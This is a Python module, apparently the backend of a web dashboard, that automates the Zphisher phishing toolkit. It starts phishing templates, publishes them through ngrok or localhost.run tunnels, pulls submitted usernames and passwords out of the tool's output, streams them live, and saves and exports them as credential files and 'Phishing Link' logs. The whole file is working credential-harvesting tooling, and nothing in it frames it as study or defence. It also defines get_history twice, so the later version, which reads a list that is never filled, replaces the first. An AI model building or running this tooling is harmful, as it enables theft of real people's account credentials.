import os
import subprocess
import threading
import time
import re
import uuid
import platform
import json
from datetime import datetime

ZPHISHER_PATH = os.path.join(os.path.dirname(__file__), 'zphisher', 'zphisher.sh')

sessions = {}
sessions_lock = threading.Lock()
socketio = None  # Will be set by app.py

# Session history (in-memory)
history = []

HISTORY_FILE = os.path.join(os.path.dirname(__file__), 'zphisher_history.json')

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return []
    with open(HISTORY_FILE, 'r') as f:
        try:
            return json.load(f)
        except Exception:
            return []

def save_history(history):
    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def add_session_to_history(session_id, session):
    history = load_history()
    entry = {
        'session_id': session_id,
        'template': session['template'],
        'tunnel_type': session['tunnel_type'],
        'public_url': session['public_url'],
        'start_time': session.get('start_time'),
        'stop_time': session.get('stop_time'),
        'status': session['status'],
        'credentials': session['credentials'],
        'output': session['output'],
    }
    # Remove old entry if exists
    history = [h for h in history if h['session_id'] != session_id]
    history.insert(0, entry)
    save_history(history)

def get_history():
    return load_history()

def get_session_detail(session_id):
    history = load_history()
    for h in history:
        if h['session_id'] == session_id:
            return h
    return None

def export_session(session_id, export_type):
    session = get_session_detail(session_id)
    if not session:
        return None, None
    if export_type == 'output':
        content = '\n'.join(session['output'])
        filename = f'zphisher_output_{session_id}.txt'
    elif export_type == 'credentials':
        content = '\n'.join(session['credentials'])
        filename = f'zphisher_credentials_{session_id}.txt'
    else:
        return None, None
    return content, filename

def is_windows():
    return os.name == 'nt' or platform.system().lower().startswith('win')

def run_bash_command(cmd_list):
    if is_windows():
        # Use WSL for Windows
        cmd = ['wsl'] + cmd_list
    else:
        cmd = cmd_list
    return cmd

def check_ngrok_available():
    try:
        result = subprocess.run(run_bash_command(['ngrok', 'version']), capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except Exception:
        return False

def check_ssh_available():
    try:
        result = subprocess.run(run_bash_command(['ssh', '-V']), capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except Exception:
        return False

def start_tunnel(tunnel_type, port):
    if tunnel_type == 'ngrok':
        ngrok_token = os.environ.get('NGROK_AUTHTOKEN')
        if ngrok_token:
            subprocess.run(run_bash_command(['ngrok', 'authtoken', ngrok_token]), check=False)
        tunnel_proc = subprocess.Popen(run_bash_command(['ngrok', 'http', str(port)]), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        url = None
        for _ in range(30):
            try:
                import requests
                resp = requests.get('http://localhost:4040/api/tunnels')
                tunnels = resp.json().get('tunnels', [])
                for t in tunnels:
                    if t['proto'] == 'https':
                        url = t['public_url']
                        break
                if url:
                    break
            except Exception:
                pass
            time.sleep(1)
        return tunnel_proc, url
    elif tunnel_type == 'localhost.run':
        tunnel_proc = subprocess.Popen(run_bash_command(['ssh', '-o', 'StrictHostKeyChecking=no', '-R', f'80:localhost:{port}', 'nokey@localhost.run']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        url = None
        for _ in range(30):
            line = tunnel_proc.stdout.readline()
            if 'https://' in line:
                url = re.search(r'(https://[\w.-]+\.localhost\.run)', line)
                if url:
                    url = url.group(1)
                    break
            time.sleep(1)
        return tunnel_proc, url
    else:
        raise ValueError('Unsupported tunnel type')

def start_zphisher(template, tunnel_type):
    session_id = str(uuid.uuid4())
    port = 8080 + int(session_id[-4:], 16) % 1000
    zphisher_cmd = run_bash_command(['bash', ZPHISHER_PATH])
    zphisher_proc = subprocess.Popen(zphisher_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    tunnel_proc, public_url = start_tunnel(tunnel_type, port)
    output = []
    credentials = []
    start_time = datetime.now().isoformat()
    def read_output():
        while True:
            line = zphisher_proc.stdout.readline()
            if not line:
                break
            output.append(line.strip())
            if 'username:' in line.lower() or 'password:' in line.lower():
                credentials.append(line.strip())
            if socketio:
                socketio.emit('zphisher_output', {
                    'session_id': session_id,
                    'line': line.strip(),
                    'credentials': credentials[-1] if credentials else None
                }, room=session_id)
    thread = threading.Thread(target=read_output, daemon=True)
    thread.start()
    with sessions_lock:
        sessions[session_id] = {
            'zphisher_proc': zphisher_proc,
            'tunnel_proc': tunnel_proc,
            'output': output,
            'credentials': credentials,
            'public_url': public_url,
            'status': 'running',
            'template': template,
            'tunnel_type': tunnel_type,
            'thread': thread,
            'start_time': start_time,
            'stop_time': None
        }
    return session_id

def get_status(session_id):
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return None
        return {
            'output': session['output'],
            'credentials': session['credentials'],
            'public_url': session['public_url'],
            'status': session['status'],
            'template': session['template'],
            'tunnel_type': session['tunnel_type']
        }

def stop_session(session_id):
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return False
        if session['zphisher_proc']:
            session['zphisher_proc'].terminate()
        if session['tunnel_proc']:
            session['tunnel_proc'].terminate()
        session['status'] = 'stopped'
        session['stop_time'] = datetime.now().isoformat()
        add_session_to_history(session_id, session)
        return True

def fetch_zphisher_templates():
    import subprocess
    import re
    if not os.path.exists(ZPHISHER_PATH):
        return []
    try:
        proc = subprocess.Popen(run_bash_command(['bash', ZPHISHER_PATH]), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output, _ = proc.communicate(timeout=20)
        templates = []
        for line in output.splitlines():
            match = re.match(r"\[\s*(\d+)\s*\]\s+(.+)", line)
            if match:
                templates.append(match.group(2).strip())
            if "Select An Attack" in line or "Select an option" in line or "Enter your choice" in line:
                break
        return templates
    except Exception:
        return []

def get_history():
    with sessions_lock:
        return [
            {
                'session_id': s['session_id'],
                'template': s['template'],
                'tunnel_type': s['tunnel_type'],
                'public_url': s['public_url'],
                'status': s['status'],
                'credentials_count': len(s['credentials']),
                'start_time': s.get('start_time'),
                'end_time': s.get('end_time')
            }
            for s in history
        ]

def get_history_detail(session_id):
    with sessions_lock:
        for s in history:
            if s['session_id'] == session_id:
                return {
                    'session_id': s['session_id'],
                    'template': s['template'],
                    'tunnel_type': s['tunnel_type'],
                    'public_url': s['public_url'],
                    'status': s['status'],
                    'credentials': s['credentials'],
                    'output': s['output'],
                    'start_time': s.get('start_time'),
                    'end_time': s.get('end_time')
                }
        return None

def export_session_log(session_id):
    detail = get_history_detail(session_id)
    if not detail:
        return None
    log = f"Session ID: {detail['session_id']}\nTemplate: {detail['template']}\nTunnel: {detail['tunnel_type']}\nStatus: {detail['status']}\nPhishing Link: {detail['public_url']}\nStart Time: {detail['start_time']}\nEnd Time: {detail['end_time']}\n\n--- Output ---\n" + '\n'.join(detail['output']) + "\n\n--- Credentials ---\n" + '\n'.join(detail['credentials'])
    return log 